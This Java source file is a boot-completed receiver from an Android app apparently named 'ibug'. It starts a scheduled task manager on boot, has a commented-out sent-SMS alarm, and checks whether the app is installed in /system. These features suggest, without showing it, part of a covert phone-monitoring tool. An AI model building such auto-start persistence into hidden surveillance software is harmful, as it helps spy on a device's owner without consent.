package com.ibug.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.util.Log;

import com.ibug.R;
import com.ibug.alarms.TaskManagerAlarm;

import static com.ibug.misc.Utils.Tag;

public class BootComplete extends BroadcastReceiver {

    private Context context;

    @Override
    public void onReceive(Context _context, Intent intent) {
        Log.d(Tag, "Boot complete");
        context = _context.getApplicationContext();
        if( Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction()) ) {
            saveAppInstallationDir();
            //SentSmsAlarm.start(context);
            TaskManagerAlarm.start(context);
        }

    }

    private boolean isSystemDir() {
        ApplicationInfo appInfo = context.getApplicationInfo();
        String installationDirectory = appInfo.dataDir;
        if (installationDirectory.startsWith("/system")) {
            return true;
        }
        return false;
    }

    private void saveAppInstallationDir() {
        SharedPreferences sharedPref = context.getSharedPreferences(Tag, Context.MODE_PRIVATE);
        SharedPreferences.Editor editor= sharedPref.edit();
        String name = context.getString(R.string.appDir);
        editor.putBoolean(name, isSystemDir());
        editor.apply();
    }

}
